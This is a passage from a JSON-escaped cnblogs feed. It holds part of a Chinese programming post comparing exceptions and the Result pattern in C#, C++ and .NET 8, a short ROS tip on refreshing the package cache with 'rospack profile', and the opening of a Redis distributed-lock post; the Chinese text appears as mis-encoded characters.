*user;\n}\n\n// 2. é”™è¯¯ç ï¼ˆä¼ ç»Ÿæ–¹å¼ï¼‰\nint login(const std::string&amp; username, \n          const std::string&amp; password,\n          User&amp; out_user) {\n    User user;\n    int err = find_user(username, user);\n    if (err != 0) return err;\n    \n    if (!verify_password(user, password)) {\n        return ERROR_INVALID_PASSWORD;\n    }\n    \n    out_user = user;\n    return 0;  // æˆåŠŸ\n}\n\n// 3. std::expectedï¼ˆC++23ï¼‰\nstd::expected&lt;User, Error&gt; login(const std::string&amp; username,\n                                 const std::string&amp; password) {\n    auto user = find_user(username);\n    if (!user) {\n        return std::unexpected(Error::UserNotFound);\n    }\n    if (!verify_password(*user, password)) {\n        return std::unexpected(Error::InvalidPassword);\n    }\n    return *user;\n}\n</code></pre>\n<p>C++çš„é€‰æ‹©ï¼š</p>\n<ul>\n<li>æ¸¸æˆå’ŒåµŒå…¥å¼ï¼šé€šå¸¸ç¦ç”¨å¼‚å¸¸ï¼Œä½¿ç”¨é”™è¯¯ç </li>\n<li>æ€§èƒ½æ•æ„Ÿåº”ç”¨ï¼šé¿å…å¼‚å¸¸ï¼Œå› ä¸ºé›¶å¼€é”€åŸåˆ™</li>\n<li>ç°ä»£C++ï¼šå€¾å‘äºstd::expectedç­‰ç±»å‹å®‰å…¨æ–¹æ¡ˆ</li>\n</ul>\n<h2 id=\"45-net-coreçš„æ”¹è¿›å’Œå±€é™\">4.5 .NET Coreçš„æ”¹è¿›å’Œå±€é™</h2>\n<p>.Net 8.0ç‰ˆæœ¬ï¼Œå®˜æ–¹å›¢é˜Ÿé’ˆå¯¹å¼‚å¸¸å¤„ç†è¿™å—è¿›è¡Œäº†å¤§å¹…çš„ä¼˜åŒ–ï¼ŒåŒ…æ‹¬é¢„åˆ†é…å¼‚å¸¸å¯¹è±¡ï¼ˆPREallocated Exceptionï¼‰ã€å»¶è¿Ÿå †æ ˆè·Ÿè¸ªç”Ÿæˆï¼ˆLazy Stack Traceï¼‰ã€å †æ ˆè·Ÿè¸ªç¼“å­˜å’Œå¤ç”¨ã€æ–°çš„å †æ ˆè·Ÿè¸ªç®—æ³•ç­‰å¤šç§æ‰‹æ®µï¼ŒåŒæ—¶ä¹Ÿå¯¹JITå’ŒRunTimeè¿›è¡Œäº†é’ˆå¯¹æ€§ä¼˜åŒ–ã€‚ä½†æ˜¯ç›®å‰æ¥çœ‹ï¼Œä¾æ—§è¿˜æœ‰å¾ˆå¤§çš„æå‡ç©ºé—´ã€‚<br />\nè¯¦æƒ…è¯·è§å®˜æ–¹å›¢é˜Ÿçš„åšå®¢ï¼š<a href=\"https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-8/#exception-handling\" rel=\"noopener nofollow\" target=\"_blank\">https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-8/#exception-handling</a></p>\n<pre><code class=\"language-csharp\">// .NET 8.0 å¯¹å‚æ•°å¼‚å¸¸çš„ç‰¹æ®Šä¼˜åŒ–\npublic void ValidateUser(string username, int age)\n{\n    // è¿™äº›è°ƒç”¨åœ¨ .NET 8.0 ä¸­éå¸¸é«˜æ•ˆ\n    ArgumentNullException.ThrowIfNull(username);\n    ArgumentOutOfRangeException.ThrowIfNegative(age);\n    ArgumentException.ThrowIfNullOrEmpty(username);\n    \n    // ä½†æ³¨æ„ï¼šä¸šåŠ¡å¼‚å¸¸ä¸åœ¨æ­¤ä¼˜åŒ–èŒƒå›´å†…ï¼\n    if (!IsValidUsername(username))\n        throw new BusinessException(\"æ— æ•ˆç”¨æˆ·å\"); // ä»£ä»·ä»ç„¶æ˜‚è´µ\n}\n</code></pre>\n<h1 id=\"äº”resultçš„è¿›é˜¶ä¼˜åŠ¿\">äº”ã€Resultçš„è¿›é˜¶ä¼˜åŠ¿</h1>\n<h2 id=\"51-ä¸°å¯Œçš„é”™è¯¯ä¿¡æ¯\">5.1 ä¸°å¯Œçš„é”™è¯¯ä¿¡æ¯</h2>\n<pre><code class=\"language-csharp\">public class Result&lt;T&gt;\n{\n    public bool Success { get; }\n    public T? Value { get; }\n    public string ErrorCode { get; }    // é”™è¯¯ä»£ç \n    public string ErrorMessage { get; } // é”™è¯¯æ¶ˆæ¯\n    public Dictionary&lt;string, object&gt; Metadata { get; } // é™„åŠ ä¿¡æ¯\n}\n\n// ä½¿ç”¨ï¼š\nvar result = Login(\"test\", \"wrong\");\nif (!result.Success)\n{\n    switch (result.ErrorCode)\n    {\n        case \"USER_NOT_FOUND\":\n            // ç”¨æˆ·ä¸å­˜åœ¨ï¼Œè·³è½¬æ³¨å†Œé¡µé¢\n            break;\n        case \"INVALID_PASSWORD\":\n            // å¯†ç é”™è¯¯ï¼Œæ˜¾ç¤ºæç¤º\n            break;\n        case \"ACCOUNT_LOCKED\":\n            // è´¦æˆ·é”å®šï¼Œæ˜¾ç¤ºé”å®šæ—¶é—´\n            var lockTime = result.Metadata[\"LockUntil\"];\n            break;\n    }\n}\n</code></pre>\n<h2 id=\"52-å‡½æ•°å¼ç¼–ç¨‹æ”¯æŒ\">5.2 å‡½æ•°å¼ç¼–ç¨‹æ”¯æŒ</h2>\n<pre><code class=\"language-csharp\">// Map - è½¬æ¢æˆåŠŸçš„å€¼\nvar userResult = GetUser(123);\nvar userName = userResult.Map(user =&gt; user.Name.ToUpper());\n\n// Bind - é“¾å¼æ“ä½œ\nvar orderResult = GetUser(123)\n    .Bind(user =&gt; GetOrder(user.CurrentOrderId))\n    .Bind(order =&gt; ValidateOrder(order));\n\n// Match - æ¨¡å¼åŒ¹é…\nvar message = loginResult.Match(\n    success: user =&gt; $\"æ¬¢è¿å›æ¥ï¼Œ{user.Name}!\",\n    failure: error =&gt; $\"ç™»å½•å¤±è´¥: {error.Message}\"\n);\n</code></pre>\n<h2 id=\"53-æ›´å¥½çš„apiè®¾è®¡\">5.3 æ›´å¥½çš„APIè®¾è®¡</h2>\n<pre><code class=\"language-csharp\">// Web APIä¸­çš„ä½¿ç”¨\n[HttpPost(\"login\")]\npublic IActionResult Login([FromBody] LoginRequest request)\n{\n    var result = _authService.Login(request);\n    \n    return result.Match&lt;IActionResult&gt;(\n        success: user =&gt; Ok(new { success = true, user }),\n        failure: error =&gt; BadRequest(new { \n            success = false, \n            errorCode = error.Code,\n            message = error.Message \n        })\n    );\n}\n\n// å®¢æˆ·ç«¯è·å¾—æ¸…æ™°çš„å“åº”ï¼š\n// æˆåŠŸ: { success: true, user: { ... } }\n// å¤±è´¥: { success: false, errorCode: \"INVALID_PASSWORD\", message: \"å¯†ç é”™è¯¯\" }\n</code></pre>\n<h1 id=\"å…­-resultæ¨¡å¼çš„ä¸€äº›å¼Šç«¯\">å…­ã€ Resultæ¨¡å¼çš„ä¸€äº›å¼Šç«¯</h1>\n<h2 id=\"61-ifåœ°ç‹±é—®é¢˜æ¡ä»¶åˆ¤æ–­æ³›æ»¥\">6.1 \"ifåœ°ç‹±\"é—®é¢˜ï¼ˆæ¡ä»¶åˆ¤æ–­æ³›æ»¥ï¼‰</h2>\n<p>æœ€å¸¸è¢«è¯Ÿç—…çš„é—®é¢˜ï¼Œå°±æ˜¯ä»£ç ä¸­å……æ–¥å¤§é‡çš„ if (!result.Success) æ£€æŸ¥ã€‚</p>\n<pre><code class=\"language-csharp\">// \"ifåœ°ç‹±\"çš„å…¸å‹ä¾‹å­\npublic Result&lt;Order&gt; ProcessOrder(int userId, OrderRequest request)\n{\n    var userResult = GetUser(userId);\n    if (!userResult.Success)\n        return Result&lt;Order&gt;.Fail(userResult.Error);\n    \n    var validationResult = ValidateOrder(request);\n    if (!validationResult.Success)\n        return Result&lt;Order&gt;.Fail(validationResult.Error);\n    \n    var inventoryResult = CheckInventory(request.Items);\n    if (!inventoryResult.Success)  \n        return Result&lt;Order&gt;.Fail(inventoryResult.Error);\n    \n    var paymentResult = ProcessPayment(userResult.Value, request);\n    if (!paymentResult.Success)\n        return Result&lt;Order&gt;.Fail(paymentResult.Error);\n    \n    // ... æ›´å¤šæ£€æŸ¥\n}\n</code></pre>\n<p>è¿™ä¸ªé—®é¢˜ï¼Œä½¿ç”¨å‡½æ•°å¼ç¼–ç¨‹æ€æƒ³å¯ä»¥å·§å¦™è§£å†³ï¼Œè¿™ä¸€å—JAVAåšçš„çœŸå¿ƒæŒºä¸é”™çš„ã€‚</p>\n<pre><code class=\"language-csharp\">// ä½¿ç”¨ Railway-Oriented Programming\npublic Result&lt;Order&gt; ProcessOrder(int userId, OrderRequest request)\n{\n    return GetUser(userId)\n        .Bind(user =&gt; ValidateOrder(request)\n            .Bind(validated =&gt; CheckInventory(request.Items)\n                .Bind(inventory =&gt; ProcessPayment(user, request)\n                    .Map(payment =&gt; CreateOrder(user, validated, payment)))));\n}\n\n// æˆ–è€…ä½¿ç”¨æ‰©å±•æ–¹æ³•\npublic Result&lt;Order&gt; ProcessOrder(int userId, OrderRequest request)\n{\n    return GetUser(userId)\n        .Then(user =&gt; ValidateOrder(request))\n        .Then(validated =&gt; CheckInventory(request.Items))\n        .Then(inventory =&gt; ProcessPayment(user, request))\n        .Map(payment =&gt; CreateOrder(user, validated, payment));\n}\n</code></pre>\n<h2 id=\"62-å€¼ç±»å‹structvs-å¼•ç”¨ç±»å‹classçš„ä¸¤éš¾é€‰æ‹©\">6.2 å€¼ç±»å‹ï¼ˆstructï¼‰vs å¼•ç”¨ç±»å‹ï¼ˆclassï¼‰çš„ä¸¤éš¾é€‰æ‹©</h2>\n<pre><code class=\"language-csharp\">public readonly struct Result&lt;T&gt;  // å€¼ç±»å‹\n{\n    private readonly T? _value;\n    private readonly string? _error;\n    \n    // é—®é¢˜1ï¼šTæ˜¯å¼•ç”¨ç±»å‹æ—¶ï¼Œstructå­˜å‚¨çš„æ˜¯å¼•ç”¨\n    // é—®é¢˜2ï¼šstructå¤åˆ¶å¼€é”€ï¼ˆå¦‚æœTæ˜¯å¤§å¯¹è±¡ï¼‰\n    // é—®é¢˜3ï¼šè£…ç®±/æ‹†ç®±å¼€é”€\n    // é—®é¢˜4ï¼šä¸èƒ½ä¸ºnullï¼Œéœ€è¦é¢å¤–çŠ¶æ€æ ‡è®°\n}\n\npublic class Result&lt;T&gt;  // å¼•ç”¨ç±»å‹\n{\n    // é—®é¢˜ï¼šæ¯ä¸ªResultéƒ½æ˜¯å †åˆ†é…ï¼Œå¢åŠ GCå‹åŠ›\n    // å³ä½¿æˆåŠŸæƒ…å†µä¹Ÿè¦åˆ†é…å¯¹è±¡\n}\n\n</code></pre>\n<p>æŠ˜ä¸­æ–¹æ¡ˆï¼šé’ˆå¯¹å€¼ç±»å‹å’Œå¼•ç”¨ç±»å‹åˆ†åˆ«ä¼˜åŒ–ï¼Œé’ˆå¯¹é€šç”¨çš„Resultå¯¹è±¡è¿›è¡Œç¼“å­˜å’Œå¤ç”¨ã€‚</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// ç»“æœåŸºç±»\n/// &lt;/summary&gt;\n/// &lt;typeparam name=\"T\"&gt;&lt;/typeparam&gt;\npublic abstract class Result&lt;T&gt;\n{\n    /// &lt;summary&gt;\n    /// æ˜¯å¦æˆåŠŸ\n    /// &lt;/summary&gt;\n    public abstract bool IsSuccess { get; }\n    /// &lt;summary&gt;\n    /// å…·ä½“è¿”å›å€¼ï¼ˆæˆåŠŸæ—¶æœ‰æ•ˆï¼‰\n    /// &lt;/summary&gt;\n    public abstract T? Value { get; }\n    /// &lt;summary&gt;\n    /// é”™è¯¯ç \n    /// &lt;/summary&gt;\n    public abstract string? ErrorCode { get; }\n    /// &lt;summary&gt;\n    /// é”™è¯¯ä¿¡æ¯\n    /// &lt;/summary&gt;\n    public abstract string? ErrorMessage { get; }\n  \n    // ç¼“å­˜å•ä¾‹æˆåŠŸï¼ˆä»…é’ˆå¯¹ default(T)ï¼‰\n    private static readonly ConcurrentDictionary&lt;Type, Result&lt;T&gt;&gt; _successCache = new();\n    //åªæŒ‰ errorCode ç¼“å­˜ï¼ˆé¿å…æŒ‰ message æ— é™å¢é•¿ï¼‰\n    private static readonly ConcurrentDictionary&lt;string, Result&lt;T&gt;&gt; _errorCache = new();  \n} \n\n/// &lt;summary&gt;\n/// ä»…ç”¨äºæ€§èƒ½å…³é”®è·¯å¾„ï¼Œä¸å­˜å‚¨å¤§å¯¹è±¡\n/// &lt;/summary&gt;\n/// &lt;typeparam name=\"T\"&gt;&lt;/typeparam&gt;\npublic readonly ref struct ValueResult&lt;T&gt; where T : struct\n{\n  //çœç•¥\n}\n\n /// &lt;summary&gt;\n /// å¼•ç”¨ç±»å‹ç»“æœï¼Œä»…ç”¨äºæ€§èƒ½å…³é”®è·¯å¾„\n /// &lt;/summary&gt;\n /// &lt;typeparam name=\"T\"&gt;&lt;/typeparam&gt;\n public readonly ref struct RefResult&lt;T&gt; where T : class\n{\n //çœç•¥\n}\n</code></pre>\n<h2 id=\"63-å¼‚æ­¥ç¼–ç¨‹çš„å¤æ‚æ€§\">6.3 å¼‚æ­¥ç¼–ç¨‹çš„å¤æ‚æ€§</h2>\n<p>åœ¨å¼‚æ­¥ç¼–ç¨‹ä¸­ï¼Œå¯èƒ½æ¯ä¸ªå¼‚æ­¥æ“ä½œéƒ½éœ€è¦å¤„ç†Resultï¼Œè¿™ä¹Ÿå¤§å¤§å¢åŠ äº†ä»£ç å¤æ‚åº¦ï¼Œå…¶å®ä¹Ÿå±äºä¸Šé¢è¯´çš„â€œif åœ°ç‹±â€èŒƒç•´ã€‚</p>\n<pre><code class=\"language-csharp\">public async Task&lt;Result&lt;User&gt;&gt; LoginAsync(string username, string password)\n{\n    // æ¯ä¸ªå¼‚æ­¥æ“ä½œéƒ½éœ€è¦å¤„ç†Result\n    var userResult = await FindUserAsync(username);\n    if (!userResult.Success)\n        return Result&lt;User&gt;.Fail(userResult.Error);\n    \n    var validationResult = await ValidatePasswordAsync(userResult.Value, password);\n    if (!validationResult.Success)\n        return Result&lt;User&gt;.Fail(validationResult.Error);\n    \n    return Result&lt;User&gt;.Ok(userResult.Value);\n}\n\n// å¯¹æ¯”å¼‚å¸¸ç‰ˆæœ¬ï¼š\npublic async Task&lt;User&gt; LoginAsync(string username, string password)\n{\n    var user = await FindUserAsync(username);  // æŠ›å¼‚å¸¸åˆ™ç›´æ¥ä¸­æ–­åç»­é€»è¾‘\n    await ValidatePasswordAsync(user, password); // æŠ›å¼‚å¸¸åˆ™ç›´æ¥ä¸­æ–­åç»­é€»è¾‘\n    return user;\n}\n</code></pre>\n<h2 id=\"64-ç±»å‹ç³»ç»Ÿå†—é•¿\">6.4 ç±»å‹ç³»ç»Ÿå†—é•¿</h2>\n<p>æ¯ä¸€ä¸ªæ¥å£æ–¹æ³•éƒ½è¦åŒ…è£¹Result,å†åŠ ä¸Šå¼‚æ­¥çš„Task,åˆ†é¡µè¯·æ±‚ç»“æœæ¨¡å‹PagedResultï¼Œå†åŠ ä¸Šç‚¹å…¶ä»–ä¸œè¥¿ï¼Œå°±ä¼šå‡ºç°ä»¤äººå¤´çš®å‘éº»çš„æ³›å‹å‚æ•°çˆ†ç‚¸&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;ã€‚<br />\nä¸‹é¢çš„ä»£ç ï¼Œæ˜¯é¡¹ç›®é‡Œé¢çš„çœŸå®ä»£ç </p>\n<pre><code class=\"language-csharp\">     /// &lt;summary&gt;\n    /// å‘˜å·¥ä¸šåŠ¡æœåŠ¡æ¥å£\n    /// &lt;/summary&gt;\n    public interface IEmployeeService\n    {\n        Task&lt;Result&lt;long&gt;&gt; CreateAsync(CreateEmployeeDto dto);\n        Task&lt;Result&lt;EmployeeDto&gt;&gt; GetByIdAsync(long id);\n        Task&lt;Result&gt; UpdateAsync(UpdateEmployeeDto dto);\n        Task&lt;Result&gt; DeleteAsync(long id);\n        Task&lt;Result&lt;PagedResult&lt;EmployeeDto&gt;&gt;&gt; GetPageListAsync(EmployeePageListDto dto);\n        Task&lt;Result&lt;List&lt;EmployeeDto&gt;&gt;&gt; GetListAsync(string? keyword = null);\n        Task&lt;Result&lt;Dictionary&lt;string,long&gt;&gt;&gt; GetEmployeeAliases(List&lt;long&gt;? employeeIds = null, bool includeShowName = true);\n    }\n</code></pre>\n<h2 id=\"65-å…¶ä»–é—®é¢˜\">6.5 å…¶ä»–é—®é¢˜</h2>\n<p>å½“ç„¶ï¼Œè¿™ç§æ¨¡å¼è¿˜æœ‰ä¸€äº›å…¶ä»–çš„é—®é¢˜ï¼Œæ¯”å¦‚å›¢é˜Ÿæˆå‘˜çš„æ¥å—åº¦ï¼Œå›¢é˜Ÿå­¦ä¹ æˆæœ¬ï¼Œä¸ç°æœ‰ä»£ç /ç”Ÿæ€çš„å…¼å®¹æ€§ï¼Œä¸ç¬¬ä¸‰æ–¹åŒ…çš„å…¼å®¹æ€§ç­‰ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€è¯´æ˜äº†ã€‚</p>\n<h1 id=\"ä¸ƒå¸¸è§é—®é¢˜ä¸ç­”ç–‘\">ä¸ƒã€å¸¸è§é—®é¢˜ä¸ç­”ç–‘</h1>\n<p><strong>Qï¼šå¼‚å¸¸ä¸æ˜¯æ›´æ–¹ä¾¿å—ï¼Ÿä¸€è¡Œä»£ç å°±èƒ½ä¸­æ–­æµç¨‹</strong><br />\nAï¼šæ–¹ä¾¿ä¸ç­‰äºæ­£ç¡®ã€‚gotoè¯­å¥ä¹Ÿå¾ˆ\"æ–¹ä¾¿\"ï¼Œä½†ç°ä»£ç¼–ç¨‹ä¸­æˆ‘ä»¬é¿å…ä½¿ç”¨å®ƒã€‚å¼‚å¸¸åœ¨ä¸šåŠ¡é€»è¾‘ä¸­å°±æ˜¯\"è¿œç¨‹goto\"ï¼Œç ´åäº†ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>\n<p><strong>Qï¼šResultéœ€è¦æ›´å¤šçš„ifåˆ¤æ–­ï¼Œä»£ç æ›´å†—é•¿</strong></p>\n<pre><code class=\"language-csharp\">// ç®€æ´çš„å¤„ç†æ–¹å¼\nvar result = Login(\"test\", \"123\");\nif (!result.Success) return result;\n\n// æˆ–è€…ä½¿ç”¨æ¨¡å¼åŒ¹é…\nvar message = result switch\n{\n    { Success: true, Value: var user } =&gt; $\"æ¬¢è¿ {user.Name}\",\n    { Error: var error } =&gt; $\"é”™è¯¯: {error}\",\n    _ =&gt; \"æœªçŸ¥çŠ¶æ€\"\n};\n</code></pre>\n<p><strong>Qï¼šæˆ‘ä»¬çš„é¡¹ç›®å¾ˆå°ï¼Œæ€§èƒ½å½±å“ä¸å¤§</strong><br />\nA:å³ä½¿ä¸è€ƒè™‘æ€§èƒ½ï¼Œä»ä»£ç è´¨é‡å’Œç»´æŠ¤æ€§è§’åº¦ï¼ŒResultä¹Ÿæ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚å¥½çš„ä¹ æƒ¯åº”è¯¥ä»é¡¹ç›®åˆæœŸå°±å¼€å§‹åŸ¹å…»ã€‚</p>\n<h1 id=\"å…«æ€»ç»“\">å…«ã€æ€»ç»“</h1>\n<p>Result ä¸æ˜¯é“¶å¼¹ï¼Œå®ƒæœ‰å®ƒé€‚ç”¨çš„åœºæ™¯ï¼Œä¹Ÿæœ‰ç›¸åº”çš„ä¸€äº›å¼Šç«¯ã€‚é€‰æ‹©çš„å…³é”®ä¸åœ¨äºå“ªä¸ª\"æ›´å¥½\"ï¼Œè€Œåœ¨äºå“ªä¸ª\"æ›´é€‚åˆ\"å½“å‰çš„åœºæ™¯å’Œçº¦æŸã€‚æ˜æ™ºçš„å·¥ç¨‹å¸ˆä¼šæ ¹æ®å…·ä½“æƒ…å†µåšå‡ºå¹³è¡¡çš„é€‰æ‹©ã€‚<br />\né€‚åˆä½¿ç”¨ Result çš„åœºæ™¯ï¼š</p>\n<ul>\n<li>é«˜é¢‘å¤±è´¥çš„æ ¡éªŒé€»è¾‘ï¼ˆè¡¨å•éªŒè¯ã€ä¸šåŠ¡è§„åˆ™æ£€æŸ¥ï¼‰</li>\n<li>éœ€è¦æ˜ç¡®é”™è¯¯åˆ†ç±»çš„ä¸šåŠ¡æµç¨‹</li>\n<li>APIè¾¹ç•Œï¼ˆéœ€è¦ç»“æ„åŒ–é”™è¯¯å“åº”ï¼‰</li>\n<li>ä¸å¤–éƒ¨ç³»ç»Ÿäº¤äº’ï¼ˆéœ€è¦å¤„ç†å„ç§å¤±è´¥æ¨¡å¼ï¼‰</li>\n<li>éœ€è¦ç»„åˆçš„å¤æ‚ä¸šåŠ¡é€»è¾‘</li>\n</ul>\n<p>ä»ç„¶é€‚åˆä½¿ç”¨å¼‚å¸¸çš„åœºæ™¯ï¼š</p>\n<ul>\n<li>çœŸæ­£çš„ç³»ç»Ÿæ•…éšœï¼ˆå†…å­˜ä¸è¶³ã€æ•°æ®åº“å´©æºƒï¼‰</li>\n<li>ç¨‹åºçŠ¶æ€å¼‚å¸¸ï¼ˆç©ºå¼•ç”¨ã€ç´¢å¼•è¶Šç•Œï¼‰</li>\n<li>ä¸æ»¡è¶³å‰ç½®æ¡ä»¶ï¼ˆæ— æ•ˆå‚æ•°ï¼‰</li>\n<li>å¼€å‘é˜¶æ®µçš„æ–­è¨€æ£€æŸ¥</li>\n<li>æä½å¤±è´¥ç‡çš„æ“ä½œ</li>\n</ul>\n<p>å…³é”®å»ºè®®ï¼š</p>\n<ul>\n<li>ä¸è¦å…¨ç›˜æ›¿æ¢ï¼šResultå’Œå¼‚å¸¸å„æœ‰é€‚ç”¨åœºæ™¯</li>\n<li>åˆ†å±‚è®¾è®¡ï¼šä¸åŒæ¶æ„å±‚ä½¿ç”¨ä¸åŒç­–ç•¥</li>\n<li>å›¢é˜Ÿå…±è¯†ï¼šå»ºç«‹æ˜ç¡®çš„è§„èŒƒå’Œè¾¹ç•Œ</li>\n<li>æ¸è¿›é‡‡ç”¨ï¼šä»æ ¸å¿ƒä¸šåŠ¡å¼€å§‹ï¼Œé€æ­¥æ‰©å±•</li>\n<li>ç›‘æ§åé¦ˆï¼šé€šè¿‡æ—¥å¿—å’Œç›‘æ§éªŒè¯é€‰æ‹©</li>\n</ul>\n<p>æœ€ç»ˆåŸåˆ™ï¼š</p>\n<ul>\n<li>å¼‚å¸¸ï¼šç”¨äº\"ä¸åº”è¯¥å‘ç”Ÿ\"çš„äº‹æƒ…</li>\n<li>Resultï¼šç”¨äº\"å¯èƒ½å‘ç”Ÿä½†éœ€è¦å¤„ç†\"çš„äº‹æƒ…</li>\n</ul>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 19:40</span>&nbsp;\n<a href=\"https://www.cnblogs.com/diamondhusky\">å‘†èŒå“ˆå£«å¥‡</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">40</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "æ–°å†™çš„launchæ–‡ä»¶ä¸èƒ½ç”¨tabè¡¥å…¨",
      "link": "https://www.cnblogs.com/zylyehuo/p/19508618",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/zylyehuo/p/19508618\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 19:38\">\n    <span>æ–°å†™çš„launchæ–‡ä»¶ä¸èƒ½ç”¨tabè¡¥å…¨</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>åšå®¢åœ°å€ï¼š<a href=\"https://www.cnblogs.com/zylyehuo/\" target=\"_blank\">https://www.cnblogs.com/zylyehuo/</a></p>\n</blockquote>\n<blockquote>\n<p>ç³»ç»Ÿç¯å¢ƒï¼šros1 noetc</p>\n</blockquote>\n<h1 id=\"é—®é¢˜æè¿°\">é—®é¢˜æè¿°</h1>\n<pre><code>launchæ–‡ä»¶ä¸èƒ½ç”¨tabè¡¥å…¨\n\nå…¨éƒ¨æ‰‹æ•²æ˜¯èƒ½è¿è¡Œçš„(æ‰§è¡Œå®Œ source ./devel/setup.bash)\n</code></pre>\n<h1 id=\"è§£å†³æ–¹æ³•\">è§£å†³æ–¹æ³•</h1>\n<blockquote>\n<p>Tab è¡¥å…¨å¤±è´¥çš„åŸå› é€šå¸¸æ˜¯ ROS çš„åŒ…ç´¢å¼•ç¼“å­˜ï¼ˆrospack cacheï¼‰æ²¡æœ‰æ›´æ–°ã€‚</p>\n</blockquote>\n<blockquote>\n<p>åœ¨ç»ˆç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¼ºåˆ¶åˆ·æ–° ROS çš„åŒ…ç´¢å¼•</p>\n</blockquote>\n<pre><code>rospack profile\n</code></pre>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260120193341341-871078635.png\" /></p>\n<h1 id=\"åŸå› åˆ†æ\">åŸå› åˆ†æ</h1>\n<ul>\n<li>\n<p>Tab è¡¥å…¨çš„æœºåˆ¶ï¼š ROS çš„ Tab è¡¥å…¨ï¼ˆbash completionï¼‰å¹¶ä¸åƒ roslaunch è¿è¡Œå‘½ä»¤é‚£æ ·ç›´æ¥å®æ—¶å»æ‰«ææ‰€æœ‰æ–‡ä»¶å¤¹ã€‚ä¸ºäº†é€Ÿåº¦ï¼Œå®ƒä¾èµ–ä¸€ä¸ªç¼“å­˜åˆ—è¡¨ã€‚</p>\n</li>\n<li>\n<p>ç¼“å­˜æ»åï¼š å½“ä½ åˆ›å»ºä¸€ä¸ªæ–°çš„åŠŸèƒ½åŒ…ï¼ˆpackageï¼‰æˆ–è€…åœ¨ä¸€ä¸ªåŒ…é‡Œæ–°åŠ äº†æ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªç¼“å­˜åˆ—è¡¨å¹¶ä¸æ€»æ˜¯ç«‹åˆ»è‡ªåŠ¨æ›´æ–°ã€‚è™½ç„¶ source ./devel/setup.bash å‘Šè¯‰äº†ç³»ç»Ÿâ€œæˆ‘çš„æ–°åŒ…åœ¨å“ªé‡Œâ€ï¼Œä½† Tab è¡¥å…¨å·¥å…·æŸ¥çš„è¿˜æ˜¯æ—§çš„â€œæˆ·å£æœ¬â€ã€‚</p>\n</li>\n<li>\n<p>rospack profile çš„ä½œç”¨ï¼š è¿™ä¸ªå‘½ä»¤ç›¸å½“äºè®© ROS é‡æ–°æ‰«æä¸€é ROS_PACKAGE_PATH ä¸‹çš„æ‰€æœ‰ç›®å½•ï¼Œå¹¶ä¿®å¤ç¼“å­˜ã€‚é€šå¸¸æ–°å»ºäº†åŒ…ä¹‹åï¼Œæœ€å¥½éƒ½æ‰‹åŠ¨æ•²ä¸€ä¸‹è¿™ä¸ªå‘½ä»¤ã€‚</p>\n</li>\n</ul>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 19:38</span>&nbsp;\n<a href=\"https://www.cnblogs.com/zylyehuo\">zylyehuo</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">2</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "å¹²è´§æ»¡æ»¡ï¼šRedis åˆ†å¸ƒå¼é”å¿…é¿çš„ 8 å¤§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ",
      "link": "https://www.cnblogs.com/sun-10387834/p/19493006",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sun-10387834/p/19493006\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 19:23\">\n    <span>å¹²è´§æ»¡æ»¡ï¼šRedis åˆ†å¸ƒå¼é”å¿…é¿çš„ 8 å¤§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼ŒRedis åˆ†å¸ƒå¼é”è™½èƒ½é«˜æ•ˆè§£å†³è·¨æœåŠ¡å¹¶å‘å†²çªï¼Œä½†å®é™…è½åœ°æ—¶ç¨ä¸æ³¨æ„å°±ä¼šè¸©å‘â€”â€”å°åˆ°æ•°æ®ä¸ä¸€è‡´ï¼Œå¤§åˆ°æœåŠ¡é›ªå´©ï¼Œè¿™äº›é—®é¢˜å¤šæºäºå¯¹ Redis ç‰¹æ€§ã€åˆ†å¸ƒå¼åœºæ™¯å¤æ‚æ€§çš„è€ƒè™‘ä¸å‘¨ã€‚ä¹‹å‰å¼€å‘ç”µå•†åº“å­˜å’Œè®¢å•ç³»ç»Ÿæ—¶ï¼Œå°±å› å¿½è§†äº†é”è¿‡æœŸã€è„‘è£‚ç­‰é—®é¢˜ï¼Œå…ˆåå‡ºç°è¿‡è¶…å–ã€é”å¤±æ•ˆç­‰æ•…éšœã€‚ä»Šå¤©ç»“åˆç”Ÿäº§å®æˆ˜ç»éªŒï¼Œæ¢³ç† Redis å®ç°åˆ†å¸ƒå¼é”æ—¶æœ€æ˜“é‡åˆ°çš„ 8 